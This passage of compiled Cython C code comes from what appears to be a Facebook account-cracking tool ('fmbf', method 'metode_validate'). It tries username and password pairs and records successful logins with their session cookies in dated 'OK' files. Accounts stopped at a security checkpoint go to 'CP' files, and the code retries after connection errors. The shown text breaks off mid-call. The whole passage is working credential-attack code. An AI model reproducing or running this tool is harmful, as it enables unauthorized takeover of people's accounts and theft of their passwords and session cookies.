          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
          __Pyx_GIVEREF(__pyx_t_7);
          PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_7);
          __pyx_t_7 = 0;
          __Pyx_INCREF(__pyx_kp_u__70);
          __pyx_t_8 += 6;
          __Pyx_GIVEREF(__pyx_kp_u__70);
          PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__70);
          __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 320, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
          __Pyx_GIVEREF(__pyx_t_7);
          PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_7);
          __pyx_t_7 = 0;
          __Pyx_INCREF(__pyx_kp_u__71);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__71);
          PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u__71);
          __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_v_pw, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 320, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
          __Pyx_GIVEREF(__pyx_t_7);
          PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_7);
          __pyx_t_7 = 0;
          __Pyx_INCREF(__pyx_kp_u__71);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__71);
          PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u__71);
          __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_v_cookie, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 320, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
          __Pyx_GIVEREF(__pyx_t_7);
          PyTuple_SET_ITEM(__pyx_t_1, 7, __pyx_t_7);
          __pyx_t_7 = 0;
          __Pyx_INCREF(__pyx_kp_u__72);
          __pyx_t_8 += 16;
          __Pyx_GIVEREF(__pyx_kp_u__72);
          PyTuple_SET_ITEM(__pyx_t_1, 8, __pyx_kp_u__72);
          __pyx_t_7 = __Pyx_PyUnicode_Join(__pyx_t_1, 9, __pyx_t_8, __pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 320, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 320, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_hari_ini); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 321, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_16 = __Pyx_PyObject_FormatSimple(__pyx_t_7, __pyx_empty_unicode); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 321, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = __Pyx_PyUnicode_Concat(__pyx_kp_u_OK_3, __pyx_t_16); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 321, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = PyTuple_New(2); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 321, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_GIVEREF(__pyx_t_7);
          PyTuple_SET_ITEM(__pyx_t_16, 0, __pyx_t_7);
          __Pyx_INCREF(__pyx_n_s_a);
          __Pyx_GIVEREF(__pyx_n_s_a);
          PyTuple_SET_ITEM(__pyx_t_16, 1, __pyx_n_s_a);
          __pyx_t_7 = 0;
          __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_16, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 321, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_write); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 321, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = PyTuple_New(7); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 321, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_8 = 0;
          __pyx_t_5 = 127;
          __Pyx_INCREF(__pyx_kp_u__73);
          __pyx_t_8 += 8;
          __Pyx_GIVEREF(__pyx_kp_u__73);
          PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u__73);
          __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 321, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
          __Pyx_GIVEREF(__pyx_t_18);
          PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_18);
          __pyx_t_18 = 0;
          __Pyx_INCREF(__pyx_kp_u__71);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__71);
          PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u__71);
          __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_v_pw, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 321, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
          __Pyx_GIVEREF(__pyx_t_18);
          PyTuple_SET_ITEM(__pyx_t_7, 3, __pyx_t_18);
          __pyx_t_18 = 0;
          __Pyx_INCREF(__pyx_kp_u__71);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__71);
          PyTuple_SET_ITEM(__pyx_t_7, 4, __pyx_kp_u__71);
          __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_v_cookie, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 321, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
          __Pyx_GIVEREF(__pyx_t_18);
          PyTuple_SET_ITEM(__pyx_t_7, 5, __pyx_t_18);
          __pyx_t_18 = 0;
          __Pyx_INCREF(__pyx_kp_u__39);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__39);
          PyTuple_SET_ITEM(__pyx_t_7, 6, __pyx_kp_u__39);
          __pyx_t_18 = __Pyx_PyUnicode_Join(__pyx_t_7, 7, __pyx_t_8, __pyx_t_5); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 321, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_16);
            if (likely(__pyx_t_7)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
              __Pyx_INCREF(__pyx_t_7);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_16, function);
            }
          }
          __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_16, __pyx_t_7, __pyx_t_18) : __Pyx_PyObject_CallOneArg(__pyx_t_16, __pyx_t_18);
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 321, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          goto __pyx_L10_break;

          
        }

        
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 323, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 323, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_18)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_18);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_16 = (__pyx_t_18) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_18) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 323, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_16, __pyx_n_s_items); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 323, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_16)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_16);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_1 = (__pyx_t_16) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_16) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 323, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_checkpoint, __pyx_t_1, Py_EQ)); if (unlikely(__pyx_t_23 < 0)) __PYX_ERR(0, 323, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_22 = (__pyx_t_23 != 0);
        if (__pyx_t_22) {

          
          __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 324, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_24 = __Pyx_PyObject_Append(__pyx_t_1, __pyx_v_user); if (unlikely(__pyx_t_24 == ((int)-1))) __PYX_ERR(0, 324, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          __pyx_t_1 = PyTuple_New(7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 325, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_8 = 0;
          __pyx_t_5 = 127;
          __Pyx_INCREF(__pyx_kp_u__69);
          __pyx_t_8 += 3;
          __Pyx_GIVEREF(__pyx_kp_u__69);
          PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u__69);
          __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_K); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 325, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_16 = __Pyx_PyObject_FormatSimple(__pyx_t_7, __pyx_empty_unicode); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 325, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_16);
          __Pyx_GIVEREF(__pyx_t_16);
          PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_16);
          __pyx_t_16 = 0;
          __Pyx_INCREF(__pyx_kp_u__70);
          __pyx_t_8 += 6;
          __Pyx_GIVEREF(__pyx_kp_u__70);
          PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__70);
          __pyx_t_16 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 325, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_16);
          __Pyx_GIVEREF(__pyx_t_16);
          PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_16);
          __pyx_t_16 = 0;
          __Pyx_INCREF(__pyx_kp_u__71);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__71);
          PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u__71);
          __pyx_t_16 = __Pyx_PyObject_FormatSimple(__pyx_v_pw, __pyx_empty_unicode); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 325, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_16);
          __Pyx_GIVEREF(__pyx_t_16);
          PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_16);
          __pyx_t_16 = 0;
          __Pyx_INCREF(__pyx_kp_u__74);
          __pyx_t_8 += 18;
          __Pyx_GIVEREF(__pyx_kp_u__74);
          PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u__74);
          __pyx_t_16 = __Pyx_PyUnicode_Join(__pyx_t_1, 7, __pyx_t_8, __pyx_t_5); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 325, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_16); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 325, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_hari_ini); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 326, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_16, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 326, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = __Pyx_PyUnicode_Concat(__pyx_kp_u_CP_3, __pyx_t_7); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 326, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 326, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_GIVEREF(__pyx_t_16);
          PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_16);
          __Pyx_INCREF(__pyx_n_s_a);
          __Pyx_GIVEREF(__pyx_n_s_a);
          PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_n_s_a);
          __pyx_t_16 = 0;
          __pyx_t_16 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_7, NULL); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 326, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_16, __pyx_n_s_write); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 326, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = PyTuple_New(5); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 326, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __pyx_t_8 = 0;
          __pyx_t_5 = 127;
          __Pyx_INCREF(__pyx_kp_u__73);
          __pyx_t_8 += 8;
          __Pyx_GIVEREF(__pyx_kp_u__73);
          PyTuple_SET_ITEM(__pyx_t_16, 0, __pyx_kp_u__73);
          __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 326, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
          __Pyx_GIVEREF(__pyx_t_18);
          PyTuple_SET_ITEM(__pyx_t_16, 1, __pyx_t_18);
          __pyx_t_18 = 0;
          __Pyx_INCREF(__pyx_kp_u__71);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__71);
          PyTuple_SET_ITEM(__pyx_t_16, 2, __pyx_kp_u__71);
          __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_v_pw, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 326, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_5;
          __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
          __Pyx_GIVEREF(__pyx_t_18);
          PyTuple_SET_ITEM(__pyx_t_16, 3, __pyx_t_18);
          __pyx_t_18 = 0;
          __Pyx_INCREF(__pyx_kp_u__39);
          __pyx_t_8 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__39);
          PyTuple_SET_ITEM(__pyx_t_16, 4, __pyx_kp_u__39);
          __pyx_t_18 = __Pyx_PyUnicode_Join(__pyx_t_16, 5, __pyx_t_8, __pyx_t_5); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 326, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_16)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_16);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
            }
          }
          __pyx_t_1 = (__pyx_t_16) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_16, __pyx_t_18) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_18);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 326, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          goto __pyx_L10_break;

          
        }

        
         {
          goto __pyx_L9_continue;
        }

        
        __pyx_L9_continue:;
      }
      __pyx_L10_break:;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
    __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

    
    __Pyx_ErrFetch(&__pyx_t_2, &__pyx_t_1, &__pyx_t_7);
    __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 329, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_18);
    __pyx_t_19 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_2, __pyx_t_18);
    __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_ErrRestore(__pyx_t_2, __pyx_t_1, __pyx_t_7);
    __pyx_t_2 = 0; __pyx_t_1 = 0; __pyx_t_7 = 0;
    if (__pyx_t_19) {
      __Pyx_AddTraceback("fmbf.Crack.metode_validate", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_1, &__pyx_t_2) < 0) __PYX_ERR(0, 329, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_2);

      
      __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_time); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 332, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_16);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_16, __pyx_n_s_sleep); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 332, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
      __pyx_t_16 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_16)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_16);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_18 = (__pyx_t_16) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_16, __pyx_int_32) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_int_32);
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 332, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_18);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_metode_validate); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 333, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_16 = NULL;
      __pyx_t_19 = 0;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_16)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_16);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
          __pyx_t_19 = 1;
        }
      }
      #if CYTHON_FAST_PYCALL
      if (PyFunction_Check(__pyx_t_6)) {
        PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_v_user, __pyx_v_pwx, __pyx_v_url};
        __pyx_t_18 = __Pyx_PyFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_19, 3+__pyx_t_19); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 333, __pyx_L5_except_error)
        __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
        __Pyx_GOTREF(__pyx_t_18);
      } else
      #endif
      #if CYTHON_FAST_PYCCALL
      if (__Pyx_PyFastCFunction_Check(__pyx_t_6)) {
        PyObject *__pyx_temp[4] = {__pyx_t_16, __pyx_v_user, __pyx_v_pwx, __pyx_v_url};
        __pyx_t_18 = __Pyx_PyCFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_19, 3+__pyx_t_19); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 333, __pyx_L5_except_error)
        __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
        __Pyx_GOTREF(__pyx_t_18);
      } else
      #endif
      {
        __pyx_t_17 = PyTuple_New(3+__pyx_t_19); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 333, __pyx_L5_except_error)
        __Pyx_GOTREF(__pyx_t_17);
        if (__pyx_t_16) {
          __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_16); __pyx_t_16 = NULL;
        }
        __Pyx_INCREF(__pyx_v_user);
        __Pyx_GIVEREF(__pyx_v_user);
        PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_19, __pyx_v_user);
        __Pyx_INCREF(__pyx_v_pwx);
